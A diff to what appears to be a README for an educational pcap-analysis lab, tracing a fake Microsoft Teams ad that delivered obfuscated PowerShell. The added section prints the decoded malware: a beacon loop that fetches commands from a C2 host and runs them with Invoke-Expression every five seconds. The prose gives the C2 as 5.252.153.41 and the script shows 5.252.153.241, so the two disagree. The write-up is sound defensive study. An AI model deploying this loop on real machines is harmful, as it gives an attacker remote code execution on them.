@@ -8,7 +8,10 @@ The specific exercise being analyzed can be found here:
 
 The purpose of this lab is educational. The aim is to gain hands-on experience with the investigative steps required to identify indicators of compromise (IOCs) in a network capture, while addressing realistic threats relevant to 2025.
 
-In this lab, I simulate a network infection scenario involving a fake Microsoft Teams advertisement delivering a malicious PowerShell script. The analysis focuses on identifying the infected host, C2 server, and malicious payload delivery mechanisms using Wireshark. Because the pcap available on the website does not contain the activities necessary to identify question 5 and 6 from the http requests, this lead to an interesting activity to dig deeper into the malicious payload downloaded. I was able to decode the powersheell script by de-obfuscating the string, and using a base
+In this lab, I simulate a network infection scenario involving a fake Microsoft Teams advertisement delivering a malicious PowerShell script. The analysis focuses on identifying the infected host, C2 server, and malicious payload delivery mechanisms using Wireshark. Because the pcap available on the website does not contain the activities necessary to identify question 5 and 6 from the http requests, this lead to an interesting activity to dig deeper into the malicious payload downloaded. I was able to decode the powersheell script by de-obfuscating the string, and using a base 64 decoding algorithm
+
+From the malicious powershell script, we were able to find that the malware uses the infected machine's C drive serial number to create a unique identifier for the host. We also found that the malware has its C2(Command & Control) server at 5.252.153.41 because it contacts this server every 5 second in an inifite loop.
+
 
 Tools Used:
 Host-only Linux VM (Kali-based)
@@ -88,6 +91,38 @@ I investigated the pcap file by first filtering http get requests. I followed th
 ### Q6) **What are the command-and-control (C2) server IP addresses used in this infection?**
 Using AI, I decoded the ps1 file found in the objects of the pcap, and found that the C2 server is also: 5.252.153.41
 
+
+### Finding and decoding the malicious powershell script
+When looking to find the malicious powershell script that was connecting to the C2 server, I found a powershell script in the list of objects on the PCAP file
+![image](https://github.com/user-attachments/assets/b364d061-7b4b-47ca-a83d-0981d9778004)
+
+When I opened the script, I found that it does not look like code, but rather a cypher. I used AI to understand how to decode the cypher. I understood that the cypher contained characters to obfuscate(these can be found from the first and last line of the ps1 file). I also understood that the remainder of the code is in base-64 encoding.
+the code to extract the malicious code in found here: https://github.com/yasserhous/PCAP-Analysis-with-Wireshark/blob/Master/decoder.py
+
+The malicious code is the following:
+''' bash
+$fso = New-Object -Com "Scripting.FileSystemObject"
+$SerialNumber = $fso.GetDrive("c:\").SerialNumber
+$SerialNumber = "{0:X}" -f $SerialNumber
+$SerialNumber = [convert]::toint64($SerialNumber,16)
+$serial = $SerialNumber
+$ip = 'http://5.252.153.241/'
+$url = $ip+$serial
+$s = New-Object System.Net.WebClient
+while ($true) {
+    try {
+        $result=$s.DownloadString($url)
+    }
+    catch {
+        Start-Sleep -s 5
+        continue
+    }
+    Invoke-Expression $result
+    Start-Sleep -s 5
+}
+
+'''
+As mentioned prior, the script creates a unique URL for the infected machine "$url = $ip+$serial" , and then through an infinite loop, it attempts to contact home ( $result=$s.DownloadString($url)) every 5 seconds.
 
 
 
